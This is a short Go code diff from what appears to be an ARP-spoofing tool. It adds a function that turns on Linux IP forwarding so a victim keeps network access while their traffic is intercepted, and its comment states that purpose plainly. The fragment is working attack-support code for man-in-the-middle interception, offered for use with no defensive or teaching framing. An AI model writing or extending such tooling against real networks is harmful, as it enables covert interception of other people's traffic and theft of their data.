@@ -64,4 +64,18 @@ func SendARPSpoof(handle *pcap.Handle, targetIP string, targetMAC string, spoofe
 
 }
 
+// This is important — otherwise, the victim loses internet when you intercept traffic.
+func EnableIPForwarding() error {
+	// 0 (forwarding disabled)
+	// 1 (fowarding enabled)
+	// echo 1 > /proc/sys/net/ipv4/ip_forward
+
+	err := os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644)
+	if err != nil {
+		return fmt.Errorf("failed to enable IP forwarding: %v", err)
+	}
+
+	return nil
+}
+
 
